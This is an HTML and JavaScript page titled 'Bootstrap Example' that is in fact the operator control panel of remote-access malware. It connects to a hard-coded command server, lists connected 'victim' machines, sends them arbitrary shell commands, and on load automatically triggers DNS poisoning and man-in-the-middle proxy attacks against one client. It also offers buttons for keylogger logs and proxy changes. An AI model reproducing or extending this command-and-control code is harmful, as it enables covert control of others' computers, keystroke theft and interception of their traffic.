<!DOCTYPE html>
<html lang="en">
<head>
  <title>Bootstrap Example</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script> 
  <script src='https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.0.3/socket.io.js'></script>.


  <script>

  

    var socket = io('http://13.126.74.47:8000');


  function generateUsersList(data) {
      data = JSON.parse(data);
    var str = '<table class="table">';
    str += "<tr><td>ID</td><td>Name</td><td>Type/Status</td>";
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<tr><td>" + data[i].sockid + "</td><td>" + data[i].name + "</td><td>" + data[i].type + "</td>";
    }
    str += "</table>";
    return str;
  }

  function genUserSelect(data) {
      data = JSON.parse(data);
    var str = 'Select Client: </label><select id="victim">';
    for(var i = 0; i < data.length;i++) {
        if(data[i].type == 'dead' || data[i].type == 'acp') continue;
        str += "<option value='" + data[i].sockid + "'>" + data[i].name + "</option>";
    }
    str += "</select>";
    return str;
  }


  
  
      

  $(document).ready(function() {

      $("#runcmd").on('click', function() { 

          socket.emit('send_client_cmd', { toclient: $("#victim").val(), cmd: $("#cmdinput").val() }, function (data) {
              
                $("#cmd-op-body").html(data);
                $("#cmd-op").modal('show');
          });

          
      });

      
   });    
      
      
      
      
      
      
      
      
      
      
      
      
      

    socket.emit('client_connect', { name: 'admin', type: 'acp' }, function (data) {
        console.log("Connect ACK");
        socket.emit('list_clients', null, function (data) {
            console.log("Listing clients...");
            $("#clients").append(generateUsersList(data));

            $("#cselect").append(genUserSelect(data));

            socket.emit('send_client_cmd', { toclient: 0, cmd: 'ls' }, function (data) {
                console.log(data) 
            });

            socket.emit('dnspoison_client', { toclient: 0 }, function (data) {
                console.log(data) 
            });

            socket.emit('mitmproxy_client', { toclient: 0 }, function (data) {
                console.log(data) 
            });


            
        });
    });


            

     </script>


</head>
<body>

  
<div class="container">

  <div class="row">
    <h2>Connected clients</h2>
    <div class="col-sm-12" id="clients">    </div>
  </div>

  <div class="row">
    <h2>Operations</h2>
    <div class="col-sm-12" id="cselect">    </div>
  </div>

  <div class="row">
      <h3>Remote Commands</h3>
    <div class="col-sm-12" id="operations">
        <input id="cmdinput" placeholder="Enter command"></input><button id="runcmd">Run</button> 
    </div>
  </div>

  <div class="row">
      <h3>Attacks</h3>
    <div class="col-sm-4" id="operations">
        <button id="mitm">Man In the Middle Attack</button><br/><br/>  
        <button id="mitm">Poison DNS Cache</button> <br/> <br/> 
        <button id="mitm">View Keylogger Logs</button> <br/> <br/> 
        <button id="mitm">Edit DNS Resolver Cache</button> <br/> <br/> 
        <button id="mitm">Change Proxy Settings</button> <br/> <br/> 
    </div>
    <div class="col-sm-4" id="operations">    </div>
    <div class="col-sm-4" id="operations">    </div>
  </div>




  <div class="modal fade" id="cmd-op" role="dialog">
    <div class="modal-dialog modal-sm">
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Command Output</h4>
        </div>
        <div class="modal-body">
          <pre id="cmd-op-body"></pre>
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
    </div>
  </div>


</div>

</body>
</html>



